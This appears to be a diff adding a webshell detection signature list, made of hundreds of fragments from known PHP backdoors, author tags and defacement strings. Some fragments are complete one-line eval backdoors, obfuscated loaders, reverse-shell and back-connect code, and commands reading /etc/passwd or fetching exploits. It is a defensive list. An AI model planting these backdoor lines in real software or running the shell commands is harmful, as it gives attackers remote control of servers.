@@ -1,0 +1,524 @@
+<?php echo exec('killall nc');?>
+<title>Laudanum Kill nc</title>
+Port: <input name="port" type="text" value="8888">
+<li>Reverse Shell -
+<li><a href="<?php echo plugins_url('file.php', __FILE__);?>">File Browser</a>
+$process = proc_open($shell, $descriptorspec, $pipes);
+printit("Successfully opened reverse shell to $ip:$port");
+$input = fread($pipes[1], $chunk_size);
+$query = isset($_POST['query']) ? $_POST['query'] : '';
+$result = dns_get_record($query, $types[$type], $authns, $addtl);
+if ($_SERVER["REMOTE_ADDR"] == $IP)
+foreach (array_keys($types) as $t) {
+register_activation_hook(__FILE__, array('WP_Laudanum', 'activate'));
+<a href="<?php echo $_SERVER['PHP_SELF']  ?>">Home</a><br/>
+$dir  = isset($_GET["dir"])  ? $_GET["dir"]  : ".";
+$curdir .= substr($curdir, -1) != "/" ? "/" : "";
+$process = proc_open($shell, $descriptorspec, $pipes);
+$shell = 'uname -a; w; id; /bin/sh -i';
+***  laudanum@secureideas.net
+*** Laudanum Project
+choraheiheihei
+else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user
+echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump')."<b>".$
+';$i=$g->query("SELECT SUBSTRING_INDEX(CURRENT_USER, '@', 1) AS User, SUBSTRIN
+if(jushRoot){var script=document.createElement('script');script.src=jushRoot+'ju
+<title>Changing CHMOD Permissions Exploit
+B1ac7Sky-->
+<?php // Source  My : Meiam
+$OOO0O0O00=__FILE__;$OOO000000=urldecode('
+if (!$this->smtp_putcmd("AUTH LOGIN", base64_encode($this->user)))
+$this->smtp_debug("> ".$cmd."\n");
+<?php // Code By isosky www.nbst.org
+$OOO0O0O00=__FILE__;$OOO000000=urldecode(
+if($pwd == md5(md5($password).$salt))
+function test_1($password)
+<?php eval($_POST[
+<a href="http://hi.baidu.com/ca3tie1/home" target="_blank">Ca3tie1's Blog</a
+function startfile($path = 'dodo.zip')
+$_REQUEST[zipname] = "dodozip.zip";
+mysql_query("SET NAMES gbk");
+$OOO0O0O00=__FILE__;$OOO000000=urldecode('
+<?php // Black
+} elseif(@is_resource($f = @popen($cfe,"r"))) {
+cf('/tmp/.bc',$back_connect);
+dumpTable($N,$M,$Hc=false){if($_POST["format"]!="sql"){echo"\xef\xbb\xbf
+;if(DB==""||!$od){echo"<a href='".h(ME)."sql='".bold(isset($_GET["sql"]
+fputs ($conn_id, "SITE EXEC ".$dir."cmd.exe /c ".$cmd."\r\n");
+function ftpcmd($ftpport,$user,$password,$dir,$cmd){
+$sendbuf = "site exec ".$_POST["SUCommand"]."\r\n";
+elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_c
+echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport
+nc -l -vv -p port(
+[+] Failed to get root :( Something's wrong.  Maybe the kernel isn't vulnerable?
+webshell</font> <font color=#00FF00>
+$txt=fopen("oracle_info.txt","w");
+$sCmd = "wget -qc ".escapeshellarg($sURL)." -O ".$sFile;
+@eval($_POST[strtoupper(md5(gmdate(
+eval(gzinflate(base64_decode('
+secparam('Hosts', @file_get_contents('/etc/hosts'));
+return base64_decode('R0lGODlhEQANAJEDAMwAAP///5mZmf///yH5BAHoAwMALAAAAAARAA0AAA
+Mode Shell v1.0
+fputs ($fp ,"\n*********************************************\nWelcome T0 Sim
+word: "<tt>null</tt>", "<tt>yes</tt>", "<tt>no</tt>", "<tt>true</tt>",
+<input type=submit value='".mm("Delete all dir/files recursive")." (rm -fr)'
+<?php ($www= $_POST['ice'])!
+H8p0bGFOEy7eAly4h4E4o88LTSVHoAglJ2KLQhUw
+echo "<P><hr size=1 noshade>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n
+eval(getenv('HTTP_CODE'));
+<font color="#858585">SHOPEN</font></a></font><font face="Verdana" style
+if (isset($_POST['mysqlw_host'])){$dbhost = $_POST['mysqlw_host'];} else {$dbhos
+case 15: $image .= "\21\0\"
+echo "<td><a href='$PHP_SELF?action=dropDB&dbname=$dbname' onClick=\"return
+<a href="?act=do"><font color="red">Go Execute</font></a></b><br /><textarea
+; (choose good passwords!).  Add uses as simple 'username = "password"' lines
+  echo "<br><center>All the data in these tables:<br> ".$tblsv." were putted
+(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU
+erde types','Getallen','Datum en tijd','Tekst','Binaire gegevens','Netwerk','Geo
+// by: The Dark Raver
+<?php $K=sTr_RepLaCe('`','','a`s`s`e`r`t');$M=$_POST[ice];IF($M==NuLl)HeaDeR('St
+<TR><TD bgcolor="<? echo (!$CONNECT && $action == "chparam")?"#660000":"#
+print "\n".'Tip: to view the file "as is" - open the page in <a href="'.Dx
+href='$PHP_SELF?action=dumpTable&dbname=$dbname&tablename=$tablename'>Dump</a>
+if (md5($_GET['usr'])==$user && md5($_GET['pass'])==$pass)
+fputs($sun_tzu,"<?php echo
+$pass = md5(md5(md5($pass)));
+$_F_F.='_'.$_P_P[5].$_P_P[20].$_P_P[13].$_P_P[2].$_P_P[19].$_P_P[8].$_P_
+$passwordPrompt = "\n=================================================
+system("mv ".$_FILES['_upl']['tmp_name']." ".$currentWD
+if($cmd!==''){ echo('<strong>'.htmlspecialchars($cmd)."</strong><hr>
+<option value="cat /etc/passwd">/etc/passwd</option>
+Hacking Mode?<br><select name='htype'><option >--------SELECT--------</op
+$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
+<p><font color=red>Wordpress Not Found! <input type=text id="wp_pat"><input ty
+<span>Posix_getpwuid ("Read" /etc/passwd)
+$header='<html><head><title>'.getenv("HTTP_HOST").' - Antichat Shell</title><m
+<font face="Verdana" style="font-size: 8pt" color="#800080">Buradan Dosya
+$pass='abcdef1234567890abcdef1234567890';
+@ini_restore("disable_functions");
+<? eval(gzinflate(base64_decode('
+array('cpp','cxx','hxx','hpp','cc','jxx','c++','vcproj')
+xmg2/G4MZ7KpNveRaLgOJvBcqa2A8/sKWp9W93NLXpTTUgRc
+<?php assert($_REQUEST["c"]);?>
+@include($_GET['bug']);
+else {echo "Running datapipe... ok! Connect to <b>".getenv("SERVER_ADDR
+kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI
+Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KIC
+$bindport_pass = "c99"
+error_reporting(0);session_start();header("Content-type:text/html;charset=utf-8
+<?php $s=@$_GET[2];if(md5($s.$s)==
+//define('pass','123456');
+if (($fsock = fsockopen($url2['host'], 80, $errno, $errstr, $fsock_timeout))
+if(is_readable($path)) antivirus($path.'/',$exs,$matches);
+Mail: chinese@hackermail.com
+Processed in <span id="runtime"></span> second(s) {gzip} usage:
+<?php eval($_POST[1]);?>
+:https://forum.90sec.org/forum.php?mod=viewthread&tid=7316
+shell.php?qid=zxexp
+<?php array_map("ass\x65rt",(array)$_REQUEST['expdoor']);?>
+<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>
+<?$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_u
+- ExpDoor.com</title>
+Liz0ziM Private Safe Mode Command Execuriton Bypass
+coded by z0mbie
+if(!$whoami)$whoami=exec("whoami"); echo "whoami :".$whoami."<br>";
+ShAnKaR
+value='Calistirmak istediginiz
+Don`t be stupid .. this is a priv3 server, so take extra care!
+Cr4sh_aka_RKL
+SimAttacker - Vrsion : 1.0.0 - priv8 4 My friend
+PHVayv 1.0
+RusH security team
+W3D Shell
+$DEF_PORTS=array (1=>'tcpmux (TCP Port Service Multiplexer)',2=>'Management Util
+vint21h@c0derz.org.ua
+News Remote PHP Shell Injection
+AK-74 Security Team Web Site: www.ak74-team.net
+Welcome to phpRemoteView (RemView)
+STNC WebShell
+<br><center><INPUT TYPE='SUBMIT' NAME='dy' VALUE='Dosya Yolla!'></center>
+print "Sending mail to $to.......
+john.barker446@gmail.com
+<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->
+smkim@popeye.snu.ac.kr
+Emperor Hacking TEAM
+Mehdi & HolyDemon
+<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]<?php echo PHPSHELL_VERSION ?></
+echo "<font color=$linkColor><b>MyShell file editor</font> File:<font color
+Simshell.css
+PHP Web Shell
+This server has been infected by $owner
+<img src="http://s43.radikal.ru/i101/1004/d8/ced1f6b2f5a9.png" align="center
+echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=pos
+class backdoor {
+http://vnhacker.org
+print "\n".'<tr><td width=100pt class=linelisting><nobr>POST (php eval)</td><
+s72 Shell v1.0 Codinf by Cr@zy_King
+<?$d='G7mHWQ9vvXiL/QX2oZ2VTDpo6g3FYAa6X+8DMIzcD0eHZaBZH7jFpZzUz7XNenxSYvBP2Wy36U
+LorD of IRAN HACKERS SABOTAGE
+www.antichat.ru
+action=mysqlread&mass=loadmass">load all defaults
+print "<tr><td><b>Execute command:</b></td><td><input size=100 name=
+Coded by n0 [nZer0]
+TouCh By iJOo
+if (move_uploaded_file($_FILES['fila']['tmp_name'], $curdir."/".$_FILES['f
+Empty Command..type \"shellhelp\" for some ehh...help
+$baglan=fopen("/tmp/$ekinci",'r');
+<div align="center">The backup process has now started<br
+Show <input type=text size=5 value=".((isset($_POST['br_st']))?$_POST['br_st']:
+Cliquez sur un nom de fichier pour lancer son telechargement. Cliquez s
+$dl=$_REQUEST['downloaD'];
+http://rst.void.ru
+Writed by DreAmeRz
+r3v3ng4ns\nDigite
+I'm FuCKeD
+if($run == 1 && $phpshellapp && $phpshellhost && $phpshellport) $strOutput .= DB
+Script Gecisi Tamamlayamadi!
+/* We have found the parent dir. We must be carefull if the parent
+W A R N I N G: Private Server
+www.ironwarez.info
+print("<br>Provenance du mail : <input type=\"text\" name=\"provenanc"
+h4ntu shell
+[*] Spawning Shell
+SooMin Kim
+<title>G-Security Webshell</title>
+echo "<b>Changing file-mode (".$d.$f."), ".view_perms_color($d.$f).
+$perl_proxy_scp = "IyEvdXNyL2Jpbi9wZXJsICANCiMhL3Vzci91c2MvcGVybC81LjAwNC9iaW4v
+<input class='inputbox' type='text' name='pass_de' size=50 onclick=this.value='
+fqb_log .= "\r\n------------------------------------------\r\nDone!
+'eng_text71'=>"Second commands param is:\r\n- for CHOWN - name of new owner o
+echo sr(45,"<b>".$lang[$language.'_text80'].$arrow."</b>","<select name=db>
+elseif (!fopen($mkfile,"w")) {echo "<b>Make File
+$sess_data["cut"] = array(); c99_s
+c99sh_sqlquery
+else {$act = "f"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPA
+$name='ec371748dc2da624b35a4f8f685dd122'
+$sql = "LOAD DATA INFILE \"".$_POST['test3_file']
+$_POST['backconnectip']
+if(rmdir($_POST['mk_name']))
+"ext_htaccess"=>array("ext_htaccess","ext_htpasswd
+<b>Dumped! Dump has been writed to
+<b>Result of execution this PHP-code</b>:<br>"
+echo $uname."</font><br><b>"
+c99ftpbrutecheck
+if(@$_POST['save'])writef($file,$_POST['data'])
+if (!empty($delerr)) {echo "<b>Deleting with errors:</b><br>".$delerr;}
+$result = mysql_query("SHOW PROCESSLIST", $sql_sock)
+elseif (!empty($ft)) {echo "<center><b>Manually selected type is incorrect. I
+'eng_text30'=>'Cat file'
+$i = $nixpasswd;
+else{$d.=@chr(($h[$e[$o]]<<4)+($h[$e[++$o]]));}}eval($d)
+@rmdir($_GET['file']) or die ("[-]Error deleting dir!");
+&nbsp;Turkish Hackers : WWW.ALTURKS.COM <br>
+<title>WwW.SaNaLTeRoR.OrG - inDEXER And ReaDer</title>
+cprthtml = "<font face='arial' size='1'>RHTOOLS 1.5 BETA(PVT) Edited By KingDef
+@eval(gzinflate(base64_decode($code)));
+<title>:: AventGrup ::.. - Sincap 1.0 | Session(Oturum) B
+// b374k 2.2
+Victim Mail :<br><input type='text' name='to' ><br>
+<title>h4ntu shell [powered by tsoi]</title>
+<title>MyShell error - Access Denied</title>
+echo "FILE UPLOADED TO $dez";
+ster" name=submit> </Font> &nbsp; &nbsp; &nbsp; <a href=mailto:mailbomb@hotmail
+by PHP Emperor<xb5@hotmail.com>
+echo "<b><font color=blue>Liz0ziM Private Safe Mode Command Execuriton Bypass E
+// a simple php backdoor | coded by z0mbie [30.08.03] | http://freenet.am/~zombi
+$currentCMD = "ls -la";
+Full server path to a writable file which will contain the Php Shell <br />
+<b>Bind /bin/bash at port: </b><input type=text name=port size=8>
+directory... Trust me - it works :-) */
+Ru24PostWebShell
+<?$d='G7mHWQ9vvXiL/QX2oZ2VTDpo6g3FYAa6X+8DMIzcD0eHZaBZH7jFpZzUz7XNenxSYvBP2Wy36U
+$c99sh_sourcesurl = "http://locus7s.com/"; //Sources-server
+<br><p><br>Safe Mode ByPAss<p><form method="POST">
+move_uploaded_file($userfile, "entrika.php");
+<p><strong>Server listeleyici</strong><br />
+<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->
+# Author Homepage: http://www.rohitab.com/
+by PHP Emperor<xb5@hotmail.com>
+|     -obzerve : mr_o@ihateclowns.com |
+<title>lama's'hell v. 3.0</title>
+<!--    http://michaeldaw.org   2006    -->
+if (!$from && !$subject && !$message && !$emaillist){
+~|_Team .:National Cracker Crew:._|~<br>
+Common php webshells. Do not host the file(s) in your server!
+* Neagu Mihai<neagumihai@hotmail.com>
+- AK-74 Security Team Web Site: www.ak74-team.net
+Powerful tool , ftp and cPanel brute forcer , php 5.2.9 safe_mode & open_basedir
+<?php passthru(getenv("HTTP_ACCEPT_LANGUAGE")); echo '<br> by q1w2e3r4'; ?>
+This Exploit Was Edited By KingDefacer
+elseif(fe("system")){ob_start();system($s);$r=ob_get_contents();ob_end_clean()
+<title>TrYaG Team - TrYaG.php - Edited By KingDefacer</title>
+@copy($file,$to) or die ("[-]Error copying file!");
+// A robust backdoor script made by Daniel Berliner - http://www.qsdconsulting.c
+By KingDefacer From Spygrup.org>
+foreach(@file($_POST['passwd']) as $fed)echo $fed;
+directory... Trust me - it works :-) */
+echo("<form method='GET' name='shell'>");
+// Created by greenwood from n57
+echo "<br>Banner: $get <br><br>"
+$dump .= "-- Cyber-Warrior.Org\n";
+# dump variables (DEBUG SCRIPT) NEEDS MODIFINY FOR B64 STATUS!!
+The requested URL /Nemo/shell/zyklonshell.txt was not found on this server.<P>
+<title>$MyShellVersion - Access Denied</title>
+$result = mysql_query($loli12) or die (mysql_error());
+<title>G-Security Webshell</title>
+print << "[kalabanga]";
+$fileperm=base_convert($_POST['fileperm'],8,10);
+zehirhacker@hotmail.com
+if (mkdir($_POST['dir'], 0777) == false) {
+$fonk_kap = get_cfg_var("fonksiyonlary_kapat");
+echo "<title>Edited By KingDefacer</title><body>"
+*   Coded by Pixcher
+'Running processes' => "runcommand('ps -aux','GET')"
+else if( $action == "dumpTable" || $action == "dumpDB" ) {
+echo('Dump for '.$db_dump.' now in '.$to_file);
+<font color="#000000">Sil</font></a></font></td>
+<input type="radio" name="tac" value="1">B64 Decode<br>
+name="duzenx2" value="Klas
+stream = imap_open("/etc/passwd", "", "");
+OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==
+lIENPTk47DQpleGl0IDA7DQp9DQp9
+Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShm
+// me at pentestmonkey@pentestmonkey.net
+echo decode(execute($cmd));
+eval(gzinflate(str_rot13(base64_decode('
+$aa = $_GET['aa'];
+href="http://www.gimpster.com/wiki/PhpShell">www.gimpster.com/wiki/PhpShell</a>
+if(empty($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW']<>$pass
+echo "<hr size=1 noshade>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n<
+if((is_dir("$deldir/$file")) AND ($file!=".") AND ($file!=".."))
+// a simple php backdoor
+PHP Files Thief
+http://www.4ngel.net
+$_POST['cmd']="echo \"Now script try connect to
+$err = "<i>Your Name</i> Not Entered!</font></h2>Sorry, \"You
+wrap="OFF">XXXX</textarea></font><font face
+copy ( $dosya_gonder
+move_uploaded_file($userfile, "entrika.php");
+.mm("Eval PHP code")
+$sql = "LOAD DATA INFILE \"".$_POST['test3_file']
+rows="24" cols="122" wrap="OFF">XXXX</textarea></font><font
+print("<p align=\"center\"><font size=\"5\">Exploit include
+open STDIN,\"<&X\";open STDOUT,\">&X\";open STDERR,\">&X\";exec(\"/bin/sh -i\")
+"txt","conf","bat","sh","js","bak","doc","log","sfc","cfg","htacce"
+AR8iROET6mMnrqTpC6W1Kp/DsTgxNby9H1xhiswfwgoAtED0y6wEXTihoAtICkIX6L1+vTUYWuWz
+1HLp1qnlCyl5gko8rDlWHqf8/JoPKvGwEm9Q4nVKvEh0b0PKle3zeFiJNyjxOiVepMSpflJkPv5s
+<input name=\"editfilename\" type=\"text\" class=\"style1\" value='".$this->inpu
+echo "<br>".ws(2)."HDD Free : <b>".view_size($free)."</b> HDD Total : <b>".view_
+"<b>".mm("Eval PHP code")."</b> (".mm("don't type")." \"&lt;?
+$yazi = "test" . "\r\n"
+if (!$nix) { $xid = implode(explode("\\",$xid),"\\\\");}echo ("<td><a href='Java
+<?php $id_info = array('notify' => 'off','sub' => 'aasd','s_name' => 'nurullahor
+echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />
+"@$SERVER_NAME ".exec("pwd")
+<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]
+<? system($_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 INTO
+<br />Input&nbsp;URL:&nbsp;&lt;input&nbsp;name=\"uploadurl\"&nbsp;type=\"text\"
+<input name="submit_btn" type="submit" value="Execute Command"></p>
+<b>".$_POST['cmd']
+xcurl('http://pastebin.com/raw.php
+@extract($_REQUEST["c99shcook"])
+if (!function_exists("c99_buff_prepare")
+if (!is_readable($o)) {return "<font color=red>".view_perms(fileperms($o))."</font>";}
+displaysecinfo("RAM",myshellexec("free -m"));
+$connection = @ftp_connect($ftp_server,$ftp_port,10);
+$blah = ex($p2." /tmp/back ".$_POST['backconnectip']." ".$_POST['backconnectport']." &");
+$blah = ex(
+cut -d: -f1,2,3 /etc/passwd | grep ::
+<OPTION VALUE="wget http://ftp.powernet.com.tr/supermail/debug/k3">Kernel attack (Krad.c) PT1 (If wget installed)
+elseif ( enabled("exec") ) { exec($cmd,$o); $output = join("\r\n",$o); }
+v0pCr3w
+nob0dyCr3w
+Hacked by
+v0pCr3w
+BENJOLSHELL
+EgY_SpIdEr
+<title>HcJ
+0wn3d
+OnLy FoR QbH
+b374k r3c0d3d
+x'1n73ct|d
+## CREATED BY KATE ##
+Ikram Ali
+FeeLCoMz
+s3n4t00r
+FaTaLisTiCz_Fx
+feelscanz.pl
+##[ KONFIGURASI
+Created by Kiss_Me
+Casper_Cell
+# [ CREWET ] #
+BY MACKER
+FraNGky
+1dt.w0lf
+Modification By iFX
+cmd.exe /c
+cmdexec("killall ping;
+r57shell.php
+v0pCr3w
+BENJOLSHELL
+EgY_SpIdEr
+<title>HcJ
+0wn3d
+OnLy FoR QbH
+wSiLm
+b374k r3c0d3d
+x'1n73ct|d
+## CREATED BY KATE ##
+Ikram Ali
+FeeLCoMz
+s3n4t00r
+FaTaLisTiCz_Fx
+feelscanz.pl
+##[ KONFIGURASI
+Created by Kiss_Me
+Casper_Cell
+# [ CREWET ] #
+BY MACKER
+FraNGky
+1dt.w0lf
+Modification By iFX
+Dumped by C99madShell.SQL
+Hacked By Alaa
+XXx_Death_xXX
+zehir3
+zehirhacker
+Shell Tcrew
+w4ck1ng
+TriCkz
+TambukCrew
+Dumped by c100.SQL
+Hacker By Task QQ
+JyHackTeam
+hacker!@#
+Fucked by 7sign
+Hacked By:NsQk
+Ch1na HLD Secur1ty Team
+hackxsy.net
+[Black Tie]
+[ Black Tie ]
+X4ck By Death
+Recoded bY 0x14113
+0x14113_Server Shell
+BY 0x14113
+[ 0x14113 ASP Shell ]
+ASP Shell
+Hacked by @iSecGroup
+@iSecGroup
+Lulzsecroot
+KingDefacer
+Turkish H4CK3RZ
+by q1w2e3r4
+By Ironfist
+AK-74 Security
+ak74-team.net
+ANTICHAT.RU nocase
+ADMINSTRATORS TOOLKIT
+ASPSpyder
+Shell v 2.1 Biz
+Ayyildiz Tim
+b374k
+Cool Surfer
+vINT 21h
+c0derz shell
+Emperor Hacking TEAM
+Comandos Exclusivos
+Gamma Group
+GFS Web-Shell
+Group Freedom Search
+h4ntu shell
+powered by tsoi
+SaNaLTeRoR
+JspWebshell
+zero.cnbct.org
+Aventis KlasVayv
+KlasVayv nocase
+Kodlama by BLaSTER
+TurkGuvenligi
+BLaSTER
+lama's'hell
+Liz0ziM
+Loader'z WEB Shell
+Loader Pro-Hack.ru
+D3vilc0de
+lostDC shell
+MAX666
+Hacked by Silver
+.:NCC:.
+National Cracker Crew
+n-c-c.6x.to
+Cr4sh_aka_RKL
+PHANTASMA
+NeW CmD
+z0mbie
+phpRemoteView
+php.spb.ru
+HolyDemon
+infilak
+Rootshell
+Emperor
+Iranian Hackers
+G-Security
+SimShell
+AventGrup
+zyklon
+lovealihack
+alihack
+faim.php
+<?php @eval($_POST['cmd']);?>
+securityprobe.net
+ccteam.ru
+c99sh_sources
+c99mad
+c99_sess_put
+p4ssw0rD
+Ajax Command Shell by
+greetings to everyone in rootshell
+We now update $work_dir to avoid things like
+ls looks much better with
+I Always Love Sha
+fileperm=substr(base_convert(fileperms
+W A R N I N G: Private Server
+for power security
+[kalabanga]
+eval(gzuncompress(base64_decode(
+uname -a
+For Server Hacking
+Private Exploit
+#chunk_split(base64_encode(
+ending mail to $to.......
+FILE UPLOADED TO $
+This server has been infected by
+Safe_Mode Bypass
+Safe Mode Shell
+CMD ExeCute
+/etc/passwd
+<?php echo exec('killall nc');?>
+<title>Laudanum Kill nc</title>
+Port: <input name="port" type="text" value="8888">
+<li>Reverse Shell -
+$process = proc_open($shell, $descriptorspec, $pipes)
+printit("Successfully opened reverse shell to $ip:$port")
+$process = proc_open($shell, $descriptorspec, $pipes)
+$shell = 'uname -a; w; id; /bin/sh -i'
+***  laudanum@secureideas.net
+*** Laudanum Project
+User-Agent: aQ0O010O
+<font color='red'><b>Connection Error!</b></font>
+if(isset($_POST["mailto"]))
+PRO Mailer V2
+<b>up!!!</b><br><br>
+encode_pass('angel');exit;
+Mail sending complet
+// silenced to avoid the "normal" warning by a faulty SSL connection
+eval ($includephpcode);
+curl_setopt($ch, CURLOPT_URL, "http://www.ask.com/web?q=
+file_get_contents("http://www.dogpile.com/search/web?qsi=
+file_get_contents("http://www.ask.com/web?q=
+"yahoo")===false
+substr($path, 0, stripos($path, '/httpdocs/') + strlen('/httpdocs/'));
+Total cPanel Found =
+3xp1r3 Cyber Army
+$createfloder = $m ? stripslashes($_POST["floder"]) : $_POST["floder"];
+get_defined_functions()
